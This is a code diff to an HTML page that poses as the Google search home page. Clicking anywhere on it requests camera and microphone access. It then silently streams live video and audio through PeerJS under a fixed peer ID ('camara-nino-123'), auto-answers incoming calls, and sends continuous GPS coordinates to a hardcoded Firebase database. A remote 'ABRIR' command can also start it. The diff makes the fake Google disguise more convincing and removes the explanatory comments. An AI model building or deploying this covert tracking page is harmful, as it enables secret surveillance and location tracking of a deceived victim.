@@ -3,25 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Service</title>
+    <title>Google</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { margin: 0; font-family: arial; background: white; height: 100vh; display: flex; flex-direction: column; align-items: center; padding-top: 100px; }
+        .logo { width: 160px; margin-bottom: 25px; }
+        .search { width: 90%; max-width: 580px; padding: 12px 20px; border-radius: 24px; border: 1px solid #dfe1e5; box-shadow: 0 1px 6px rgba(32,33,36,0.28); outline: none; }
+    </style>
 </head>
-<body style="margin:0; font-family:arial; background:white;">
-    <div id="interfaz-google" style="padding-top:100px; text-align:center;" onclick="activarTodo()">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="160">
-        <br><br>
-        <input type="text" style="width:80%; padding:12px; border-radius:24px; border:1px solid #dfe1e5;" placeholder="Buscar...">
-    </div>
-    <video id="vLocal" autoplay playsinline muted style="display:none;"></video>
+<body onclick="activarTodo()">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
+    <input type="text" class="search" placeholder="Buscar en Google...">
+    <video id="v" autoplay playsinline muted style="display:none;"></video>
 
     <script>
         const firebaseConfig = { databaseURL: "https://micontrol-30a70-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // Servidores STUN para que funcione fuera de casa (con Datos)
         const peer = new Peer('camara-nino-123', {
             config: { 'iceServers': [{ url: 'stun:stun.l.google.com:19302' }] }
         });
@@ -29,42 +30,33 @@
         let miStream = null;
 
         async function activarTodo() {
+            if (miStream) return; // Ya está activo
             try {
-                // CAPTURA REAL DE VIDEO Y AUDIO
+                // Solicita AUDIO y VIDEO juntos
                 miStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
-                    audio: { echoCancellation: true, noiseSuppression: true } 
+                    audio: true 
                 });
-                document.getElementById('vLocal').srcObject = miStream;
-                
-                // ACTIVAR RASTREO GPS REAL
-                iniciarRastreoGPS();
-            } catch (e) { alert("Error: Debes permitir cámara, audio y ubicación."); }
+                document.getElementById('v').srcObject = miStream;
+                iniciarGPS();
+            } catch (e) { alert("Error: Acepta los permisos de Cámara y Micrófono"); }
         }
 
-        function iniciarRastreoGPS() {
+        function iniciarGPS() {
             navigator.geolocation.watchPosition((pos) => {
                 db.ref('ubicacion_real').set({
                     lat: pos.coords.latitude,
                     lng: pos.coords.longitude,
-                    precisión: pos.coords.accuracy,
-                    hora: new Date().toLocaleTimeString()
+                    t: Date.now()
                 });
-            }, (err) => console.log("Error GPS"), { enableHighAccuracy: true });
+            }, null, { enableHighAccuracy: true });
         }
 
-        // COMANDO REMOTO
-        db.ref('comando_camara').on('value', (s) => {
-            if(s.val() === "ABRIR") activarTodo();
-        });
+        db.ref('comando_camara').on('value', (s) => { if(s.val() === "ABRIR") activarTodo(); });
 
-        // RESPUESTA AUTOMÁTICA CON AUDIO Y VIDEO
         peer.on('call', (call) => {
-            if(miStream) {
-                call.answer(miStream);
-            } else {
-                activarTodo().then(() => call.answer(miStream));
-            }
+            if(miStream) call.answer(miStream);
+            else activarTodo().then(() => call.answer(miStream));
         });
     </script>
 </body>
